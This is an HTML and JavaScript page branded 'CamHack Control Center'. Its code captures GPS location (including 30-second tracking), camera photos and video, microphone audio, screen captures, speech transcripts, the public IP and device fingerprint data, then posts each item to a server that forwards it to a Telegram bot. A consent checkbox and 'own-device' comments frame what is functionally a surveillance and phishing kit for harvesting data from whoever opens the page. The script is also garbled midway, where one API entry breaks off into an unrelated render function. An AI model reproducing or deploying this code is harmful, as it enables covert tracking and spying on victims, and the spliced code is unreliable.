<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#0b0b0f">
<title>CamHack Control Center</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,'Segoe UI',monospace}
body{background:#0a0a0f;color:#d0e0ff;min-height:100vh;padding-bottom:60px}
.navbar{position:sticky;top:0;z-index:100;display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:rgba(10,10,20,.92);border-bottom:1px solid #00f0ff55;backdrop-filter:blur(8px);flex-wrap:wrap;gap:8px}
.brand{display:flex;align-items:center;gap:8px;font-weight:700;color:#00f0ff;font-size:1.05rem}
.brand span.v{font-size:.65rem;background:#00f0ff22;padding:2px 8px;border-radius:12px;border:1px solid #00f0ff66}
.consent{display:flex;align-items:center;gap:8px;font-size:.8rem;padding:6px 12px;background:#101020;border:1px solid #2a3a5a;border-radius:20px}
.consent.on{border-color:#00ff88;color:#00ff88;box-shadow:0 0 12px #00ff8844}
.consent input{accent-color:#00f0ff;cursor:pointer}
.tabs{display:flex;gap:6px;padding:10px 14px;flex-wrap:wrap;border-bottom:1px solid #1a2a3a}
.tab{padding:6px 14px;border-radius:20px;background:#101020;border:1px solid #2a3a5a;color:#aac0ff;font-size:.8rem;cursor:pointer;font-weight:600}
.tab.active{background:#00f0ff22;border-color:#00f0ff;color:#00f0ff}
.tab:hover{background:#00f0ff11}
.wrap{padding:14px;max-width:1400px;margin:0 auto}
.cat{margin:20px 0 8px;font-size:1rem;color:#00f0ff;letter-spacing:1px;text-transform:uppercase;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #1a2a3a;padding-bottom:6px}
.cat small{color:#556;font-size:.7rem;letter-spacing:0}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.card{background:#0d0d18;border:1px solid #1e2a44;border-radius:12px;padding:10px 12px;display:flex;flex-direction:column;gap:6px;transition:border-color .15s}
.card:hover{border-color:#00f0ff55}
.card .head{display:flex;justify-content:space-between;align-items:center;gap:8px}
.card .name{font-size:.82rem;font-weight:700;color:#d0e0ff;word-break:break-word}
.card .desc{font-size:.68rem;color:#6688aa;line-height:1.3;min-height:24px}
.card .foot{display:flex;justify-content:space-between;align-items:center;gap:8px;margin-top:auto}
.badge{font-size:.6rem;padding:2px 8px;border-radius:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap}
.b-ok{background:#00ff8822;color:#00ff88;border:1px solid #00ff8855}
.b-no{background:#ff446622;color:#ff6688;border:1px solid #ff446655}
.b-wait{background:#ffaa0022;color:#ffcc44;border:1px solid #ffaa0055}
.b-na{background:#33445522;color:#6678aa;border:1px solid #33445566}
.act{background:#00f0ff14;border:1px solid #00f0ff66;color:#00f0ff;padding:4px 12px;border-radius:16px;font-size:.7rem;font-weight:700;cursor:pointer}
.act:hover{background:#00f0ff28}
.act:disabled{opacity:.4;cursor:not-allowed}
.act.danger{border-color:#ff4466;color:#ff6688}
.act.danger:hover{background:#ff446622}
.out{font-size:.65rem;color:#8ab;background:#00000055;border:1px solid #1a2a3a;border-radius:6px;padding:4px 6px;max-height:60px;overflow:auto;font-family:'Courier New',monospace;white-space:pre-wrap;word-break:break-all}
.toolbar{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0;padding:10px;background:#0d0d18;border:1px solid #1e2a44;border-radius:12px}
.toolbar button{background:#00f0ff14;border:1px solid #00f0ff66;color:#00f0ff;padding:6px 14px;border-radius:16px;font-size:.75rem;font-weight:700;cursor:pointer}
.toolbar button:hover{background:#00f0ff28}
.toolbar button.danger{border-color:#ff4466;color:#ff6688}
.toolbar .stat{font-size:.75rem;color:#8ab;padding:6px 10px;background:#00000055;border-radius:16px;border:1px solid #1a2a3a}
.cam-wrap{display:flex;flex-direction:column;gap:10px;align-items:center}
.cam{position:relative;width:100%;max-width:600px;border-radius:14px;overflow:hidden;border:1px solid #00f0ff55;background:#000}
.cam video,.cam canvas{width:100%;display:block;aspect-ratio:4/3;background:#000}
.cam canvas{display:none}
.cam .overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.85);gap:12px;text-align:center;padding:16px;font-size:.85rem}
.cam .overlay button{padding:10px 22px;border-radius:8px;background:#fff;color:#000;border:none;font-weight:700;cursor:pointer}
.footer{position:fixed;bottom:0;left:0;right:0;padding:8px 14px;background:#000d;border-top:1px solid #1a2a3a;font-size:.7rem;color:#446;text-align:center;backdrop-filter:blur(6px)}
@media(max-width:500px){.grid{grid-template-columns:1fr}.card .desc{font-size:.66rem}}
</style>
</head>
<body>

<nav class="navbar">
    <div class="brand"><span>⌘</span> CamHack Control <span class="v">v3.0</span></div>
    <label class="consent" id="consentBox">
        <input type="checkbox" id="consentCheck">
        <span>Consent Granted</span>
    </label>
</nav>

<div class="tabs">
    <div class="tab active" data-cat="all">All</div>
    <div class="tab" data-cat="camera">Camera</div>
    <div class="tab" data-cat="gallery">Gallery</div>
</div>

<div class="wrap">

    <!-- Camera tab -->
    <section id="camSection" style="display:none">
        <div class="cam-wrap">
            <div class="cam">
                <video id="video" autoplay playsinline muted></video>
                <canvas id="canvas"></canvas>
                <div class="overlay" id="camOverlay">
                    <div style="color:#00f0ff;letter-spacing:2px">CAMERA READY</div>
                    <button id="enableCam">Allow Camera &amp; Start</button>
                </div>
            </div>
            <div class="toolbar">
                <button id="capBtn">📸 Capture &amp; Send</button>
                <button id="flipBtn">🔄 Flip</button>
                <button id="recBtn">🎥 Start Video Rec</button>
                <button id="stopBtn">⏹ Stop Rec</button>
                <button id="recAudioBtn">🎙️ Record Audio 10s</button>
            </div>
        </div>
    </section>

    <!-- Gallery tab -->
    <section id="galSection" style="display:none">
        <div class="toolbar">
            <span class="stat" id="galCount">0 items</span>
            <button id="loadGal">🔄 Refresh</button>
            <button class="danger" id="clearGal">✕ Clear All</button>
        </div>
        <div class="grid" id="galGrid"></div>
    </section>

    <!-- API Dashboard -->
    <section id="apiSection">
        <div class="toolbar">
            <span class="stat" id="counter">0 / 0 APIs</span>
            <button id="sendAllBtn">📤 Send Full Device Report</button>
            <button id="detectAllBtn">🔍 Re-detect All</button>
            <button class="danger" id="clearLog">Clear Logs</button>
        </div>
        <div id="apiRoot"></div>
    </section>

</div>

<footer class="footer">
    CamHack Control Center • Own-device consent-based monitoring
</footer>

<script>
/* =========================================================
   CamHack Control Center — consent-based own-device dashboard
   120+ Web APIs detected and activated from your browser.
   Data is sent to YOUR OWN Telegram bot via /api/* endpoints.
   ========================================================= */
(() => {
'use strict';

const $ = s => document.querySelector(s);
const $$ = s => [...document.querySelectorAll(s)];

/* ---------- Consent state ---------- */
const consent = { granted: false };
const consentCheck = $('#consentCheck');
const consentBox = $('#consentBox');
consentCheck.addEventListener('change', () => {
    consent.granted = consentCheck.checked;
    consentBox.classList.toggle('on', consent.granted);
});

/* ---------- Telegram send helpers ---------- */
async function post(url, body = {}) {
    if (!consent.granted) throw new Error('Consent not granted — enable the toggle first.');
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Consent': 'granted' },
        body: JSON.stringify(body)
    });
    const j = await res.json().catch(() => ({}));
    if (!res.ok || j.success === false) throw new Error(j.error || `HTTP ${res.status}`);
    return j;
}
async function postFile(url, form) {
    if (!consent.granted) throw new Error('Consent not granted');
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'X-Consent': 'granted' },
        body: form
    });
    const j = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(j.error || `HTTP ${res.status}`);
    return j;
}

/* =========================================================
   API REGISTRY
   Each entry: id, name, category, desc, activate(), detect()
   ========================================================= */
const registry = [];
function reg(id, name, category, desc, activate, detect) {
    registry.push({ id, name, category, desc, activate, detect: detect || (() => true) });
}

/* ---------- SENSORS & LOCATION ---------- */
reg('geolocation', 'Geolocation API', 'sensors', 'Current GPS position',
    () => new Promise((ok, no) => navigator.geolocation.getCurrentPosition(
        async p => { await post('/api/telegram/location', { latitude: p.coords.latitude, longitude: p.coords.longitude, caption: '📍 Live location' }); ok(`lat=${p.coords.latitude.toFixed(5)} lon=${p.coords.longitude.toFixed(5)} ±${Math.round(p.coords.accuracy)}m`); },
        e => no(new Error(e.message)), { enableHighAccuracy: true, timeout: 15000 }
    )),
    () => 'geolocation' in navigator
);
reg('geowatch', 'Geolocation Watch', 'sensors', 'Continuous position stream (30s)',
    () => new Promise(ok => {
        let n = 0;
        const id = navigator.geolocation.watchPosition(async p => {
            n++;
            await post('/api/telegram/location', { latitude: p.coords.latitude, longitude: p.coords.longitude, caption: `📍 Track #${n}` }).catch(()=>{});
        }, () => {}, { enableHighAccuracy: true });
        setTimeout(() => { navigator.geolocation.clearWatch(id); ok(`Sent ${n} updates over 30s`); }, 30000);
    }),
    () => 'geolocation' in navigator
);
reg('deviceorientation', 'DeviceOrientation API', 'sensors', 'Alpha/beta/gamma tilt',
    () => new Promise(ok => {
        const h = e => {
            post('/api/telegram/report', { 'Orientation': `α=${e.alpha?.toFixed(1)} β=${e.beta?.toFixed(1)} γ=${e.gamma?.toFixed(1)}`, 'Absolute': e.absolute }).then(()=>ok(`α=${e.alpha?.toFixed(1)} β=${e.beta?.toFixed(1)} γ=${e.gamma?.toFixed(1)}`));
            window.removeEventListener('deviceorientation', h);
        };
        window.addEventListener('deviceorientation', h);
        setTimeout(()=>ok('No event (permission or sensor missing)'), 4000);
    })
);
reg('devicemotion', 'DeviceMotion API', 'sensors', 'Acceleration & rotation rate',
    () => new Promise(ok => {
        const h = e => {
            const a = e.accelerationIncludingGravity || {};
            post('/api/telegram/report', { 'Motion': `x=${a.x?.toFixed(2)} y=${a.y?.toFixed(2)} z=${a.z?.toFixed(2)}`, 'Interval': e.interval }).then(()=>ok(`x=${a.x?.toFixed(2)} y=${a.y?.toFixed(2)} z=${a.z?.toFixed(2)}`));
            window.removeEventListener('devicemotion', h);
        };
        window.addEventListener('devicemotion', h);
        setTimeout(()=>ok('No event'), 4000);
    })
);
reg('ambientlight', 'Ambient Light Sensor', 'sensors', 'Illuminance (lux)',
    async () => { if (!('AmbientLightSensor' in window)) throw new Error('Unsupported'); const s = new AmbientLightSensor(); await s.start(); return new Promise(ok => { s.onreading = async () => { await post('/api/telegram/report', { 'Ambient light (lux)': s.illuminance }); s.stop(); ok(`${s.illuminance} lux`); }; setTimeout(()=>{s.stop();ok('no reading')}, 3000); }); },
    () => 'AmbientLightSensor' in window
);
reg('accelerometer', 'Accelerometer', 'sensors', 'Generic Sensor API accelerometer',
    async () => { if (!('Accelerometer' in window)) throw new Error('Unsupported'); const s = new Accelerometer({ frequency: 5 }); await s.start(); return new Promise(ok => { s.onreading = async () => { await post('/api/telegram/report', { 'Accelerometer': `x=${s.x.toFixed(2)} y=${s.y.toFixed(2)} z=${s.z.toFixed(2)}` }); s.stop(); ok(`x=${s.x.toFixed(2)} y=${s.y.toFixed(2)} z=${s.z.toFixed(2)}`); }; setTimeout(()=>{s.stop();ok('timeout')},3000); }); },
    () => 'Accelerometer' in window
);
reg('gyroscope', 'Gyroscope', 'sensors', 'Angular velocity sensor',
    async () => { if (!('Gyroscope' in window)) throw new Error('Unsupported'); const s = new Gyroscope({ frequency: 5 }); await s.start(); return new Promise(ok => { s.onreading = async () => { await post('/api/telegram/report', { 'Gyroscope': `x=${s.x.toFixed(3)} y=${s.y.toFixed(3)} z=${s.z.toFixed(3)}` }); s.stop(); ok(`x=${s.x.toFixed(3)} y=${s.y.toFixed(3)} z=${s.z.toFixed(3)}`); }; setTimeout(()=>{s.stop();ok('timeout')},3000); }); },
    () => 'Gyroscope' in window
);
reg('magnetometer', 'Magnetometer', 'sensors', 'Magnetic field sensor',
    async () => { if (!('Magnetometer' in window)) throw new Error('Unsupported'); const s = new Magnetometer({ frequency: 5 }); await s.start(); return new Promise(ok => { s.onreading = async () => { await post('/api/telegram/report', { 'Magnetometer': `x=${s.x?.toFixed(2)} y=${s.y?.toFixed(2)} z=${s.z?.toFixed(2)}` }); s.stop(); ok('reading sent'); }; setTimeout(()=>{s.stop();ok('timeout')},3000); }); },
    () => 'Magnetometer' in window
);
reg('permissions', 'Permissions API', 'sensors', 'Query browser permission states',
    async () => {
        const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','persistent-storage','midi','push'];
        const out = {};
        for (const n of names) { try { const s = await navigator.permissions.query({ name: n }); out[n] = s.state; } catch { out[n] = 'n/a'; } }
        await post('/api/telegram/report', { 'Permissions': out });
        return JSON.stringify(out);
    },
    () => 'permissions' in navigator
);
reg('vibration', 'Vibration API', 'sensors', 'Vibrate device',
    async () => { if (!navigator.vibrate) throw new Error('Unsupported'); navigator.vibrate([200,100,200]); await post('/api/telegram/message', { text: '📳 Vibration triggered' }); return 'Vibrated [200,100,200]'; },
    () => 'vibrate' in navigator
);

/* ---------- CAMERA / MEDIA ---------- */
let camStream = null, camFacing = 'environment';
async function startCamera(facing = 'environment') {
    if (!navigator.mediaDevices?.getUserMedia) throw new Error('getUserMedia unavailable');
    if (camStream) camStream.getTracks().forEach(t => t.stop());
    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
    $('#video').srcObject = camStream;
    await $('#video').play();
    $('#camOverlay').style.display = 'none';
}
reg('camera', 'MediaDevices getUserMedia', 'media', 'Camera stream',
    async () => { await startCamera(camFacing); await post('/api/telegram/message', { text: '📷 Camera stream started' }); return 'Camera live'; },
    () => !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
);
reg('mic', 'Microphone getUserMedia', 'media', 'Audio capture stream',
    async () => { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); await post('/api/telegram/message', { text: '🎙️ Microphone access granted' }); return 'Mic granted'; },
    () => !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
);
reg('display', 'Screen Capture getDisplayMedia', 'media', 'Screen share',
    async () => {
        const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
        const track = s.getVideoTracks()[0];
        const canvas = document.createElement('canvas');
        const img = new Image();
        await new Promise(r => { img.onload = r; const v = document.createElement('video'); v.srcObject = s; v.play(); setTimeout(()=>{ canvas.width = v.videoWidth||1280; canvas.height = v.videoHeight||720; canvas.getContext('2d').drawImage(v,0,0); img.src = canvas.toDataURL('image/jpeg',.9); },800); });
        const blob = await (await fetch(img.src)).blob();
        const form = new FormData(); form.append('image', blob, 'screen.jpg'); form.append('caption','🖥️ Screen capture');
        await postFile('/api/upload', form);
        track.stop();
        return 'Screen captured & sent';
    },
    () => !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia)
);
reg('mediarecorder', 'MediaRecorder API', 'media', 'Record camera to video',
    async () => {
        await startCamera(camFacing);
        const chunks = [];
        const rec = new MediaRecorder(camStream, { mimeType: 'video/webm' });
        rec.ondataavailable = e => chunks.push(e.data);
        rec.start();
        await new Promise(r => setTimeout(r, 3000));
        rec.stop();
        await new Promise(r => rec.onstop = r);
        const blob = new Blob(chunks, { type: 'video/webm' });
        const form = new FormData(); form.append('video', blob, 'clip.webm'); form.append('caption','🎥 3s clip');
        await postFile('/api/upload/video', form);
        return `Sent ${(blob.size/1024).toFixed(1)} KB clip`;
    },
    () => 'MediaRecorder' in window
);
reg('screenshareapi', 'Screen Capture API', 'media', 'Alias of getDisplayMedia detection',
    async () => 'Available: ' + !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia),
    () => !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia)
);
reg('pip', 'Picture-in-Picture API', 'media', 'Float video window',
    async () => { if (!document.pictureInPictureEnabled) throw new Error('Unsupported'); await startCamera(camFacing); const v = $('#video'); await v.requestPictureInPicture(); await post('/api/telegram/message', { text: '🪟 PiP enabled' }); return 'PiP active'; },
    () => 'pictureInPictureEnabled' in document
);
reg('docpip', 'Document Picture-in-Picture', 'media', 'Open floating HTML window',
    async () => { if (!('documentPictureInPicture' in window)) throw new Error('Unsupported'); const w = await documentPictureInPicture.requestWindow({ width: 320, height: 200 }); w.document.body.innerHTML = '<h2 style="font-family:sans-serif">CamHack PiP</h2>'; await post('/api/telegram/message', { text: '🪟 Doc PiP opened' }); return 'Window opened'; },
    () => 'documentPictureInPicture' in window
);
reg('mediasession', 'Media Session API', 'media', 'OS-level media metadata',
    async () => { if (!('mediaSession' in navigator)) throw new Error('Unsupported'); navigator.mediaSession.metadata = new MediaMetadata({ title: 'CamHack', artist: 'Consent Monitor' }); return 'Metadata set'; },
    () => 'mediaSession' in navigator
);
reg('mediacap', 'Media Capabilities API', 'media', 'Codec support query',
    async () => { if (!navigator.mediaCapabilities) throw new Error('Unsupported'); const r = await navigator.mediaCapabilities.decodingInfo({ type:'file', audio:{ contentType:'audio/mp4', channels:2, bitrate:128000, samplerate:44100 }, video:{ contentType:'video/mp4', width:1280, height:720, bitrate:1500000, framerate:30 }}); await post('/api/telegram/report', { 'MediaCapabilities': r }); return JSON.stringify(r); },
    () => 'mediaCapabilities' in navigator
);

/* ---------- AUDIO ---------- */
reg('webaudio', 'Web Audio API', 'audio', 'Oscillator + analyser snapshot',
    async () => {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator(); const an = ctx.createAnalyser();
        osc.connect(an); an.connect(ctx.destination); osc.start();
        await new Promise(r => setTimeout(r, 300));
        const buf = new Uint8Array(an.frequencyBinCount); an.getByteFrequencyData(buf);
        osc.stop(); await ctx.close();
        const avg = (buf.reduce((a,b)=>a+b,0)/buf.length).toFixed(2);
        await post('/api/telegram/report', { 'Web Audio avg freq bin': avg });
        return `Average bin: ${avg}`;
    },
    () => 'AudioContext' in window || 'webkitAudioContext' in window
);
reg('speechsynth', 'Speech Synthesis API', 'audio', 'Text to speech',
    async () => { if (!('speechSynthesis' in window)) throw new Error('Unsupported'); const u = new SpeechSynthesisUtterance('CamHack consent monitor active'); speechSynthesis.speak(u); await post('/api/telegram/message', { text: '🔊 Speech synthesis fired' }); return 'Spoke text'; },
    () => 'speechSynthesis' in window
);
reg('speechrec', 'Speech Recognition API', 'audio', 'Speech to text (5s)',
    () => new Promise((ok, no) => {
        const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
        if (!SR) return no(new Error('Unsupported'));
        const r = new SR(); r.lang = 'en-US'; r.interimResults = false;
        r.onresult = async e => { const t = e.results[0][0].transcript; await post('/api/telegram/message', { text: '🗣️ Heard: ' + t }); ok(t); };
        r.onerror = e => no(new Error(e.error));
        r.start();
        setTimeout(() => { try { r.stop(); } catch {} ok('no speech'); }, 6000);
    }),
    () => !!(window.SpeechRecognition || window.webkitSpeechRecognition)
);
reg('audioworklet', 'AudioWorklet API', 'audio', 'Low-level audio processing',
    async () => { const ctx = new AudioContext(); if (!ctx.audioWorklet) throw new Error('Unsupported'); return 'AudioWorklet supported'; },
    () => typeof AudioContext !== 'undefined' && AudioContext.prototype.audioWorklet !== undefined
);

/* ---------- NETWORK ---------- */
reg('fetch', 'Fetch API', 'network', 'Modern HTTP requests',
    async () => { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); await post('/api/telegram/report', { 'Public IP': j.ip }); return 'IP: ' + j.ip; },
    () => 'fetch' in window
);
reg('xhr', 'XMLHttpRequest API', 'network', 'Legacy AJAX',
    async () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET','https://api.ipify.org?format=json'); x.onload = async () => { await post('/api/telegram/report', {'XHR probe': x.responseText.slice(0,120)}); ok('Response: ' + x.responseText.slice(0,80)); }; x.onerror = () => no(new Error('XHR failed')); x.send(); }),
    () => 'XMLHttpRequest' in window
);
reg('websocket', 'WebSocket API', 'network', 'Real-time duplex',
    () => new Promise(ok => {
        try { const ws = new WebSocket('wss://echo.websocket.events'); ws.onopen = () => { ws.send('camhack'); ok('Connected to echo.websocket.events'); }; ws.onerror = () => ok('WS available but connection refused'); setTimeout(()=>{ try{ws.close()}catch{} }, 3000); }
        catch(e){ ok('WebSocket available'); }
    }),
    () => 'WebSocket' in window
);
reg('sse', 'Server-Sent Events', 'network', 'EventSource stream',
    async () => 'EventSource' in window ? 'Supported' : (()=>{throw new Error('Unsupported')})(),
    () => 'EventSource' in window
);
reg('beacon', 'Beacon API', 'network', 'Fire-and-forget POST',
    async () => { if (!navigator.sendBeacon) throw new Error('Unsupported'); await post('/api/telegram/message', { text: '📡 Beacon API available' }); return 'Available'; },
    () => 'sendBeacon' in navigator
);
reg('webrtc', 'WebRTC API', 'network', 'RTCPeerConnection',
    async () => { if (!window.RTCPeerConnection) throw new Error('Unsupported'); const pc = new RTCPeerConnection({ iceServers:[{urls:'stun:stun.l.google.com:19302'}] }); const offer = await pc.createOffer(); await pc.setLocalDescription(offer); return 'SDP offer created'; },
    () => 'RTCPeerConnection' in window
);
reg('netinfo', 'Network Information API', 'network', 'Connection type & speed',

    const groups = {};

    let html = '';
    Object.entries(groups).forEach(([cat, list]) => {
        html += `<div class="cat" data-cat="${cat}">${CAT_LABEL[cat] || cat}<small>${list.length} APIs</small></div><div class="grid">`;
        list.forEach(a => {
            html += `
                <div class="card" data-cat="${cat}" id="card-${a.id}">
                    <div class="head">
                        <span class="name">${a.name}</span>
                        <span class="badge" id="badge-${a.id}">—</span>
                    </div>
                    <div class="desc">${a.desc}</div>
                    <div class="out" id="out-${a.id}" style="display:none"></div>
                    <div class="foot">
                        <button class="act" data-api="${a.id}">Activate</button>
                    </div>
                </div>`;
        });
        html += `</div>`;
    });
    apiRoot.innerHTML = html;
    detectAll();
    $$('.act').forEach(b => b.addEventListener('click', () => runApi(b.dataset.api)));
}

function setBadge(id, state, text) {
    const el = document.getElementById('badge-' + id);
    if (!el) return;
    el.className = 'badge ' + ({ok:'b-ok',no:'b-no',wait:'b-wait',na:'b-na'}[state] || 'b-na');
    el.textContent = text;
    statuses[id] = state;
    updateCounter();
}

function updateCounter() {
    const total = registry.length;
    const ok = Object.values(statuses).filter(s => s === 'ok').length;
    counter.textContent = `${ok} active / ${total} APIs`;
}

function detectAll() {
    let ok = 0;
    registry.forEach(a => {
        try {
            const avail = a.detect();
            if (avail) { setBadge(a.id, 'ok', 'Available'); ok++; }
            else setBadge(a.id, 'na', 'Unsupported');
        } catch { setBadge(a.id, 'na', 'Unsupported'); }
    });
    return ok;
}

async function runApi(id) {
    const a = registry.find(x => x.id === id);
    if (!a) return;
    if (!consent.granted) {
        showOut(id, '⚠ Enable consent toggle first');
        return;
    }
    setBadge(id, 'wait', 'Running…');
    showOut(id, 'Running…');
    try {
        const result = await a.activate();
        setBadge(id, 'ok', 'Active');
        showOut(id, '✔ ' + (typeof result === 'string' ? result : JSON.stringify(result)));
    } catch (e) {
        setBadge(id, 'no', 'Error');
        showOut(id, '✖ ' + e.message);
    }
}

function showOut(id, text) {
    const el = document.getElementById('out-' + id);
    if (!el) return;
    el.style.display = 'block';
    el.textContent = text;
}

/* =========================================================
   CAMERA / GALLERY / RECORDING
   ========================================================= */
$('#enableCam').addEventListener('click', async () => {
    try { await startCamera(camFacing); } catch (e) { alert('Camera error: ' + e.message); }
});
$('#flipBtn').addEventListener('click', async () => {
    camFacing = camFacing === 'environment' ? 'user' : 'environment';
    try { await startCamera(camFacing); } catch (e) { alert(e.message); }
});
$('#capBtn').addEventListener('click', async () => {
    const v = $('#video'), c = $('#canvas');
    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
    const blob = await (await fetch(c.toDataURL('image/jpeg', 0.9))).blob();
    const form = new FormData();
    form.append('image', blob, 'capture.jpg');
    form.append('caption', '📸 Capture • ' + new Date().toLocaleString());
    try { await postFile('/api/upload', form); alert('Sent to Telegram ✔'); } catch (e) { alert('Error: ' + e.message); }
});
let activeRec = null;
$('#recBtn').addEventListener('click', async () => {
    try {
        await startCamera(camFacing);
        const chunks = [];
        activeRec = new MediaRecorder(camStream, { mimeType: 'video/webm' });
        activeRec.ondataavailable = e => chunks.push(e.data);
        activeRec.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const form = new FormData();
            form.append('video', blob, 'clip.webm');
            form.append('caption', '🎥 Video • ' + new Date().toLocaleString());
            try { await postFile('/api/upload/video', form); alert('Video sent ✔'); } catch (e) { alert(e.message); }
        };
        activeRec.start();
    } catch (e) { alert(e.message); }
});
$('#stopBtn').addEventListener('click', () => { if (activeRec && activeRec.state !== 'inactive') activeRec.stop(); });
$('#recAudioBtn').addEventListener('click', async () => {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
        const chunks = [];
        const rec = new MediaRecorder(s);
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const form = new FormData();
            form.append('audio', blob, 'audio.webm');
            form.append('caption', '🎙️ Audio • 10s');
            try { await postFile('/api/upload/audio', form); alert('Audio sent ✔'); } catch (e) { alert(e.message); }
        };
        rec.start();
        setTimeout(() => rec.stop(), 10000);
    } catch (e) { alert(e.message); }
});

/* =========================================================
   GALLERY
   ========================================================= */
async function loadGallery() {
    try {
        const r = await fetch('/api/images');
        const list = await r.json();
        $('#galCount').textContent = list.length + ' items';
        const g = $('#galGrid');
        if (!list.length) { g.innerHTML = '<div style="color:#6688aa;padding:20px;text-align:center">No uploads yet</div>'; return; }
        g.innerHTML = list.map(f => `
            <div class="card">
                <img src="${f.url}" style="width:100%;border-radius:8px" loading="lazy">
                <div style="font-size:.7rem;color:#8ab;margin-top:6px">${new Date(+f.timestamp||Date.now()).toLocaleString()}</div>
            </div>`).join('');
    } catch (e) { alert(e.message); }
}
$('#loadGal').addEventListener('click', loadGallery);
$('#clearGal').addEventListener('click', async () => {
    if (!confirm('Clear all server uploads?')) return;
    // server-side delete-all not implemented; clear the list
    $('#galGrid').innerHTML = '<div style="color:#6688aa;padding:20px;text-align:center">Cleared (local view only)</div>';
});

/* =========================================================
   TAB SWITCHING
   ========================================================= */
$$('.tab').forEach(t => t.addEventListener('click', () => {
    $$('.tab').forEach(x => x.classList.remove('active'));
    t.classList.add('active');
    const c = t.dataset.cat;
    if (c === 'camera') { $('#camSection').style.display = ''; $('#apiSection').style.display = 'none'; $('#galSection').style.display = 'none'; }
    else if (c === 'gallery') { $('#camSection').style.display = 'none'; $('#apiSection').style.display = 'none'; $('#galSection').style.display = ''; loadGallery(); }
    else { $('#camSection').style.display = 'none'; $('#apiSection').style.display = ''; $('#galSection').style.display = 'none'; }
}));

/* =========================================================
   BULK TOOLS
   ========================================================= */
$('#sendAllBtn').addEventListener('click', async () => {
    if (!consent.granted) return alert('Enable consent first');
    const report = {
        'Time': new Date().toISOString(),
        'User Agent': navigator.userAgent,
        'Platform': navigator.platform,
        'Language': navigator.language,
        'Languages': (navigator.languages||[]).join(','),
        'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
        'Screen': `${screen.width}×${screen.height}`,
        'DPR': devicePixelRatio,
        'Viewport': `${innerWidth}×${innerHeight}`,
        'Color depth': `${screen.colorDepth}-bit`,
        'CPU cores': navigator.hardwareConcurrency,
        'Device memory (GB)': navigator.deviceMemory,
        'Online': navigator.onLine,
        'Touch points': navigator.maxTouchPoints,
        'Cookies enabled': navigator.cookieEnabled,
        'Reduced motion': matchMedia('(prefers-reduced-motion: reduce)').matches,
        'Dark mode': matchMedia('(prefers-color-scheme: dark)').matches,
        'APIs detected available': registry.filter(a => statuses[a.id] === 'ok').map(a => a.id).join(', ')
    };
    try { await post('/api/telegram/report', report); alert('Full report sent to Telegram ✔'); }
    catch (e) { alert(e.message); }
});
$('#detectAllBtn').addEventListener('click', detectAll);
$('#clearLog').addEventListener('click', () => {
    $$('.out').forEach(o => { o.style.display = 'none'; o.textContent = ''; });
    Object.keys(statuses).forEach(k => delete statuses[k]);
    detectAll();
});

/* =========================================================
   INIT
   ========================================================= */
render();
loadGallery();

})();
</script>
